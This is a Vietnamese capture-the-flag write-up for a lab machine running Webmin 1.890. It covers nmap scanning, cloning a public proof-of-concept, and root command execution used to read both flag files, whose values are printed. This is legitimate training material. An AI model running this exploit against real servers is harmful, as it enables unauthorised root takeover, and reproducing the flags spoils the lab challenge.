# Source

<figure><img src="../.gitbook/assets/image (677).png" alt=""><figcaption></figcaption></figure>

## ANALYZE

<figure><img src="../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

Đầu tiên ta sẽ tiến hành scan NMAP bằng lệnh :&#x20;

```bash
sudo nmap -sV -sC 10.49.135.74
```

<figure><img src="../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

Ta thu dc 1 số thông tin như là :&#x20;

* ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
* Port 10000 có MiniServ 1.890 (Webmin httpd) ⇒ đây là 1 phiên bản khá cũ và có thể có CVE

<figure><img src="../.gitbook/assets/image (680).png" alt=""><figcaption></figcaption></figure>

[https://github.com/n0obit4/Webmin\_1.890-POC](https://github.com/n0obit4/Webmin_1.890-POC)



Sau khi thử truy cập vào port 10000 , thì ta có được giao diện như sau&#x20;

<figure><img src="../.gitbook/assets/image (681).png" alt=""><figcaption></figcaption></figure>

Khi truy cập vào địa chỉ `http://10.49.135.74:10000`, server trả về thông báo lỗi cho biết dịch vụ này chỉ hỗ trợ SSL. Điều này nghĩa là ta cần sử dụng giao thức HTTPS để kết nối, cụ thể là qua URL `https://ip-10-49-135-74.ap-south-1.compute.internal:10000/`&#x20;



## EXPLOIT

```bash
canhieu@DESKTOP-DBGES7N:~$ git clone https://github.com/n0obit4/Webmin_1.890-POC.git
Cloning into 'Webmin_1.890-POC'...
remote: Enumerating objects: 43, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 43 (delta 17), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (43/43), 37.66 KiB | 341.00 KiB/s, done.
Resolving deltas: 100% (17/17), done.
canhieu@DESKTOP-DBGES7N:~$ cd Webmin_1.890-POC
canhieu@DESKTOP-DBGES7N:~/Webmin_1.890-POC$ python3 Webmin_exploit.py --help
usage: Webmin_exploit.py [-h] -host IP [-port Port] [-cmd Command]

Webmin 1.890 expired Remote Root POC

options:
  -h, --help    show this help message and exit
  -host IP      Host to attack
  -port Port    Port of the host ~ 10000 is Default
  -cmd Command  Command to execute ~ id is Default

python3 Webmin_exploit.py -host target -port 10000 -cmd id
canhieu@DESKTOP-DBGES7N:~/Webmin_1.890-POC$ python3 Webmin_exploit.py -host ip-10-49-135-74.ap-south-1.compute.internal -port 10000 -cmd id

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

                        By: n0obit4
                        Github: https://github.com/n0obit4
----------------------------------------
Your password has expired, and a new one must be chosen.
uid=0(root) gid=0(root) groups=0(root)
```

⇒ CF đã có thể RCE với quyền root user



### Root flag

```
canhieu@DESKTOP-DBGES7N:~/Webmin_1.890-POC$ python3 Webmin_exploit.py -host ip-10-49-135-74.ap-south-1.compute.internal -port 10000 -cmd "cat /root/root.txt"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

                        By: n0obit4
                        Github: https://github.com/n0obit4
----------------------------------------
Your password has expired, and a new one must be chosen.
THM{UPDATE_YOUR_INSTALL}
```

### User flag

```bash
canhieu@DESKTOP-DBGES7N:~/Webmin_1.890-POC$ python3 Webmin_exploit.py -host ip-10-49-135-74.ap-south-1.compute.internal -port 10000 -cmd "ls -la /home/dark"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

                        By: n0obit4
                        Github: https://github.com/n0obit4
----------------------------------------
Your password has expired, and a new one must be chosen.
total 15228
drwxr-xr-x 5 dark dark     4096 Jun 26  2020 .
drwxr-xr-x 3 root root     4096 Jun 26  2020 ..
-rw------- 1 dark dark        7 Jun 26  2020 .bash_history
-rw-r--r-- 1 dark dark      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dark dark     3771 Apr  4  2018 .bashrc
drwx------ 2 dark dark     4096 Jun 26  2020 .cache
drwx------ 3 dark dark     4096 Jun 26  2020 .gnupg
drwxrwxr-x 3 dark dark     4096 Jun 26  2020 .local
-rw-r--r-- 1 dark dark      807 Apr  4  2018 .profile
-rw-r--r-- 1 dark dark        0 Jun 26  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 dark dark       29 Jun 26  2020 user.txt
-rw-rw-r-- 1 dark dark 15550066 Jun 26  2020 webmin_1.890_all.deb

canhieu@DESKTOP-DBGES7N:~/Webmin_1.890-POC$ python3 Webmin_exploit.py -host ip-10-49-135-74.ap-south-1.compute.internal -port 10000 -cmd "ls -la /home/dark/user.txt"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

                        By: n0obit4
                        Github: https://github.com/n0obit4
----------------------------------------
Your password has expired, and a new one must be chosen.
-rw-rw-r-- 1 dark dark 29 Jun 26  2020 /home/dark/user.txt

canhieu@DESKTOP-DBGES7N:~/Webmin_1.890-POC$ python3 Webmin_exploit.py -host ip-10-49-135-74.ap-south-1.compute.internal -port 10000 -cmd "cat /home/dark/use
r.txt"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

                        By: n0obit4
                        Github: https://github.com/n0obit4
----------------------------------------
Your password has expired, and a new one must be chosen.
THM{SUPPLY_CHAIN_COMPROMISE}

```

